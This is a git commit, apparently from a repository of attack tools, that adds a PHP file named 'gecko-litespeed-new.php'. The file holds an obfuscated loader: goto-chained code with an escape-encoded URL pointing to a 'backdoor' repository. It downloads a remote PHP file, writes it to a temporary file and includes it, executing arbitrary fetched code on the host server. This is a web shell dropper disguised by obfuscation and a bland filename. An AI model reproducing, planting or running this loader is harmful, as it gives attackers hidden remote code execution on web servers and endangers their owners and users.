16fb8a98d0906c4612dbf282e32bec11d63d0bb5
exploits77 <schatz.dicky@proton.me>
2025-11-04 22:57:56 +0700

    Add files via upload

---
+++ gecko-litespeed-new.php
@@ -0,0 +1,3 @@
+<?php
+
+goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\164\x74\x70\163\x3a\x2f\x2f\x72\141\x77\x2e\x67\151\x74\150\x75\142\x75\163\x65\162\143\x6f\x6e\164\x65\156\164\x2e\x63\x6f\155\x2f\145\x78\160\154\x6f\151\x74\163\x37\x37\x2f\142\x61\x63\153\x64\157\157\162\x2f\162\x65\x66\163\x2f\150\x65\x61\144\x73\x2f\155\x61\151\x6e\x2f\147\x65\143\153\x6f\x2d\160\x77\x2e\160\150\160")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
